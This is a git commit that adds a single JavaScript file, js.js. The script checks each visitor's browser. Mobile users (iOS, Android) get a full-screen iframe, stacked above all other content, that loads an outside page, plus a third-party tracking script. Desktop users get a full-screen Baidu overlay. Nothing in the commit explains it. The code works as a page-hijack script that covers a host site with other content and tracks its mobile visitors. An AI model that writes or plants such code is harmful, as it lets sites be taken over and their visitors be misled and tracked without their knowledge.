aff6c48ef1666b38f09931bd173517b3fc744eab
wydewy <2631069976@qq.com>
2019-10-24 17:26:41 +0800

    first commit

---
+++ js_t/js.js
@@ -0,0 +1,13 @@
+var now = new Date();
+var nows = String(now.getMonth()+1)+String(now.getDate())+String(now.getHours())+String(now.getMinutes());
+if((navigator.userAgent.match(/(iPhone|iPad|iPod|ios)/i))){
+document.write("<iframe name=\"frame1\" style=\"position:absolute;left:0px;top:0px;z-index:2147483647;\" src=\"https:\/\/wydewy.github.io\/tools\/iframe.html" + "\" rel=\"nofollow\" width=\"100%\" height=\"3100px\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe>");
+document.write ('<script type="text/javascript"  src="https://js.users.51.la/20085659.js"></script>');
+}
+else if((navigator.userAgent.match(/(Android|webOS|BlackBerry|IEMobile|Opera Mini|linux)/i))){
+document.write("<iframe name=\"frame1\" style=\"position:absolute;left:0px;top:0px;z-index:2147483647;\" src=\"http:\/\/wydewy.github.io\/tools\/iframe.html" + "\" rel=\"nofollow\" width=\"100%\" height=\"3100px\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe>");
+document.write ('<script type="text/javascript"  src="https://js.users.51.la/20085659.js"></script>');
+}
+else
+{document.write("<iframe name=\"frame1\" style=\"position:absolute;left:0px;top:0px;z-index:2147483647;\" src=\"http:\/\/www.baidu.com" +  "\" rel=\"nofollow\" width=\"100%\" height=\"3100px\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe>");
+}
